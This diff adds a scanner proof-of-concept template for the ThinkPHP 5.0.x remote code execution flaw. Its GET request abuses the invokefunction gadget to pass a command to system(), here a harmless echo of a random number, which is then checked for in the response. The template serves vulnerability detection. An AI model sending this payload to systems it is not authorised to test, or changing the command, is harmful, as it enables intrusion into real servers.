@@ -1,0 +1,16 @@
+name: poc-thinkphp-rce
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20{{r0}}"
+    expression: response.status == 200 && response.body.bcontains("{{r0}}")
+expression: r0()
+detail:
+  author: sxel
+  description: ThinkPHP 5.0.x RCE (invokefunction gadget)
+  severity: critical
+  tags: thinkphp,php,rce
